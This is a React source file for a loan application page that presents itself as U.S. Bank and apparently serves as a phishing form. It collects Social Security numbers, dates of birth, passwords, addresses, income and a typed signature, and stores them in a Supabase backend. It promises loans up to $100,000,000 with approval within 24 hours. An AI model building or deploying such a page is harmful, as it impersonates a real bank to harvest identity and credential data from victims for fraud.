import { useEffect, useState } from "react";
import { Link } from "@tanstack/react-router";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Slider } from "@/components/ui/slider";
import { Textarea } from "@/components/ui/textarea";
import { CheckCircle2, Clock } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";


type Form = {
  firstName: string;
  lastName: string;
  ssn: string;
  dob: string;
  cellPhone: string;
  email: string;
  password: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  employer: string;
  jobTitle: string;
  annualIncome: string;
  loanPurpose: string;
  signature: string;
};

const empty: Form = {
  firstName: "",
  lastName: "",
  ssn: "",
  dob: "",
  cellPhone: "",
  email: "",
  password: "",
  street: "",
  city: "",
  state: "",
  zip: "",
  employer: "",
  jobTitle: "",
  annualIncome: "",
  loanPurpose: "",
  signature: "",
};

export function LoanApplication({
  initialAmount,
  apr = 8.99,
  termMonths = 60,
}: {
  initialAmount: number;
  apr?: number;
  termMonths?: number;
}) {
  const [amount, setAmount] = useState(initialAmount);
  const [form, setForm] = useState<Form>(empty);
  const [agreed, setAgreed] = useState(false);
  const [busy, setBusy] = useState(false);
  const [submitted, setSubmitted] = useState(false);


  useEffect(() => {
    if (!submitted) setAmount(initialAmount);
  }, [initialAmount, submitted]);

  const set = (k: keyof Form) => (e: { target: { value: string } }) =>
    setForm((f) => ({ ...f, [k]: e.target.value }));

  async function submit(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);

    const email = form.email.trim();
    let userId: string | null = null;

    const signUp = await supabase.auth.signUp({
      email,
      password: form.password,
      options: {
        emailRedirectTo: `${window.location.origin}/account`,
        data: {
          first_name: form.firstName,
          last_name: form.lastName,
          cell_phone: form.cellPhone,
        },
      },
    });

    if (signUp.error) {
      const signIn = await supabase.auth.signInWithPassword({
        email,
        password: form.password,
      });
      if (signIn.error) {
        setBusy(false);
        toast.error("Could not create your account", {
          description:
            "This email already has an account. Use its password to continue, or sign in first.",
        });
        return;
      }
      userId = signIn.data.user?.id ?? null;
    } else {
      userId = signUp.data.user?.id ?? null;
      if (!signUp.data.session) {
        await supabase.auth.signInWithPassword({ email, password: form.password });
      }
    }

    if (!userId) {
      setBusy(false);
      toast.error("Could not create your account");
      return;
    }

    await supabase
      .from("profiles")
      .update({
        first_name: form.firstName,
        last_name: form.lastName,
        email,
        cell_phone: form.cellPhone,
        street: form.street,
        city: form.city,
        state: form.state,
        zip: form.zip,
      })
      .eq("id", userId);

    const { error } = await supabase.from("loan_applications").insert({
      user_id: userId,
      amount,
      apr,
      term_months: termMonths,
      first_name: form.firstName,
      last_name: form.lastName,
      ssn: form.ssn,
      dob: form.dob || null,
      cell_phone: form.cellPhone,
      email,
      street: form.street,
      city: form.city,
      state: form.state,
      zip: form.zip,
      employer: form.employer,
      job_title: form.jobTitle,
      annual_income: form.annualIncome,
      loan_purpose: form.loanPurpose,
      signature: form.signature,
    });

    setBusy(false);
    if (error) {
      toast.error("Submission failed", { description: error.message });
      return;
    }
    setSubmitted(true);
  }

  if (submitted) {
    return (
      <div className="rounded-xl border bg-card p-8 text-center shadow-[var(--shadow-card)]">
        <CheckCircle2 className="mx-auto h-12 w-12 text-primary" />
        <h3 className="mt-4 text-2xl font-bold text-foreground">
          Loan request submitted
        </h3>
        <p className="mt-2 text-muted-foreground">
          Your request for{" "}
          <span className="font-semibold text-foreground">
            ${amount.toLocaleString()}
          </span>{" "}
          has been placed with a U.S. Bank loan officer.
        </p>
        <div className="mx-auto mt-6 flex max-w-sm items-center gap-3 rounded-lg bg-surface p-4 text-left">
          <Clock className="h-5 w-5 shrink-0 text-accent" />
          <p className="text-sm text-foreground">
            Approval by a loan officer under 24 hours. Your account{" "}
            <span className="font-medium">{form.email}</span> is now active — sign in
            from any device to track your disbursement.
          </p>
        </div>
        <Button asChild size="lg" className="mt-6">
          <Link to="/account">Go to my account</Link>
        </Button>
      </div>
    );
  }

  return (
    <form
      className="rounded-xl border bg-card p-6 shadow-[var(--shadow-card)] sm:p-8"
      onSubmit={submit}
    >

      <h3 className="text-xl font-bold text-foreground">Loan application</h3>
      <p className="mt-1 text-sm text-muted-foreground">
        Complete your information below. All fields are required.
      </p>

      <div className="mt-6">
        <div className="flex items-end justify-between">
          <Label>Requested loan amount</Label>
          <span className="text-2xl font-bold text-primary">
            ${amount.toLocaleString()}
          </span>
        </div>
        <Slider
          className="mt-4"
          min={10000}
          max={100000000}
          step={10000}
          value={[amount]}
          onValueChange={(v) => setAmount(v[0])}
        />
        <div className="mt-2 flex justify-between text-xs text-muted-foreground">
          <span>$10,000</span>
          <span>$100,000,000</span>
        </div>
      </div>

      <Section title="Personal information">
        <Field label="First name">
          <Input required value={form.firstName} onChange={set("firstName")} />
        </Field>
        <Field label="Last name">
          <Input required value={form.lastName} onChange={set("lastName")} />
        </Field>
        <Field label="Social Security Number (SSN)">
          <Input
            required
            inputMode="numeric"
            maxLength={11}
            placeholder="123-45-6789"
            value={form.ssn}
            onChange={set("ssn")}
          />
        </Field>
        <Field label="Date of birth">
          <Input required type="date" value={form.dob} onChange={set("dob")} />
        </Field>
        <Field label="Cell phone number">
          <Input
            required
            type="tel"
            placeholder="(555) 555-5555"
            value={form.cellPhone}
            onChange={set("cellPhone")}
          />
        </Field>
        <Field label="Email address">
          <Input required type="email" value={form.email} onChange={set("email")} />
        </Field>
        <Field label="Password">
          <Input
            required
            type="password"
            minLength={8}
            value={form.password}
            onChange={set("password")}
          />
        </Field>
      </Section>

      <Section title="Home address">
        <Field label="Street address" full>
          <Input required value={form.street} onChange={set("street")} />
        </Field>
        <Field label="City">
          <Input required value={form.city} onChange={set("city")} />
        </Field>
        <Field label="State">
          <Input required maxLength={2} placeholder="MN" value={form.state} onChange={set("state")} />
        </Field>
        <Field label="ZIP code">
          <Input required inputMode="numeric" maxLength={5} value={form.zip} onChange={set("zip")} />
        </Field>
      </Section>

      <Section title="Employment & income">
        <Field label="Employer">
          <Input required value={form.employer} onChange={set("employer")} />
        </Field>
        <Field label="Job title">
          <Input required value={form.jobTitle} onChange={set("jobTitle")} />
        </Field>
        <Field label="Annual income">
          <Input
            required
            inputMode="numeric"
            placeholder="$65,000"
            value={form.annualIncome}
            onChange={set("annualIncome")}
          />
        </Field>
        <Field label="Loan purpose" full>
          <Textarea
            required
            rows={3}
            value={form.loanPurpose}
            onChange={set("loanPurpose")}
          />
        </Field>
      </Section>

      <Section title="Loan agreement">
        <div className="col-span-full space-y-4">
          <div className="max-h-40 overflow-y-auto rounded-lg bg-surface p-4 text-sm text-muted-foreground">
            <p>
              This Loan Agreement is entered into between the borrower named above and
              U.S. Bank. The borrower agrees to repay the principal amount of $
              {amount.toLocaleString()} plus interest at the disclosed annual percentage
              rate in equal monthly installments over the selected term. The borrower
              certifies that all information provided in this application, including
              Social Security Number, date of birth, contact details, employment and
              income, is true, complete and accurate, and authorizes U.S. Bank to verify
              this information and obtain credit reports. Late payments may result in
              additional fees and may be reported to credit bureaus. The borrower may
              prepay the loan in full or in part at any time without penalty. By signing
              below, the borrower acknowledges having read, understood and agreed to the
              terms of this Loan Agreement and consents to receive electronic
              disclosures and communications.
            </p>
          </div>

          <div className="flex items-start gap-3">
            <Checkbox
              id="agree"
              checked={agreed}
              onCheckedChange={(v) => setAgreed(v === true)}
            />
            <Label htmlFor="agree" className="text-sm font-normal leading-snug">
              I have read and agree to the Loan Agreement and its terms.
            </Label>
          </div>

          <Field label="Electronic signature (type your full legal name)" full>
            <Input
              required
              placeholder="Your full legal name"
              className="font-serif text-lg italic"
              value={form.signature}
              onChange={set("signature")}
            />
          </Field>
        </div>
      </Section>

      <Button
        type="submit"
        size="lg"
        className="mt-8 w-full"
        disabled={!agreed || busy}
      >
        {busy ? "Submitting…" : "Submit loan request"}
      </Button>

      <p className="mt-3 text-center text-xs text-muted-foreground">
        Your request will be placed for approval by a loan officer under 24 hours.
      </p>
    </form>
  );
}

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="mt-8 border-t pt-6">
      <h4 className="text-sm font-semibold uppercase tracking-wide text-primary">
        {title}
      </h4>
      <div className="mt-4 grid gap-4 sm:grid-cols-2">{children}</div>
    </div>
  );
}

function Field({
  label,
  children,
  full,
}: {
  label: string;
  children: React.ReactNode;
  full?: boolean;
}) {
  return (
    <div className={`space-y-2 ${full ? "sm:col-span-2" : ""}`}>
      <Label>{label}</Label>
      {children}
    </div>
  );
}
